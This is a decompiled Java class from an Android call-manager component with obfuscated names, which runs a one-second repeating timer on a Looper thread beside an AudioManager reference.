package com.vvt.callmanager.a;

import android.media.AudioManager;
import android.os.Looper;
import com.vvt.h.a;
import java.util.Timer;
import java.util.TimerTask;

public class h
  extends Thread
{
  private static final boolean a = a.a;
  private AudioManager b;
  private Looper c;
  private j d;
  private Timer e;
  private TimerTask f;
  
  public h(AudioManager paramAudioManager, j paramj)
  {
    this.b = paramAudioManager;
    this.d = paramj;
  }
  
  public void a()
  {
    Object localObject = this.f;
    if (localObject != null)
    {
      localObject = this.f;
      ((TimerTask)localObject).cancel();
      this.f = null;
    }
    localObject = this.e;
    if (localObject != null)
    {
      localObject = this.e;
      ((Timer)localObject).cancel();
      this.e = null;
    }
    localObject = this.c;
    if (localObject != null)
    {
      localObject = this.c;
      ((Looper)localObject).quit();
    }
  }
  
  public void run()
  {
    long l = 1000L;
    Looper.prepare();
    Object localObject = Looper.myLooper();
    this.c = ((Looper)localObject);
    localObject = new com/vvt/callmanager/a/i;
    ((i)localObject).<init>(this);
    this.f = ((TimerTask)localObject);
    localObject = new java/util/Timer;
    ((Timer)localObject).<init>();
    this.e = ((Timer)localObject);
    localObject = this.e;
    TimerTask localTimerTask = this.f;
    ((Timer)localObject).schedule(localTimerTask, l, l);
    Looper.loop();
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/getInstance/h.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */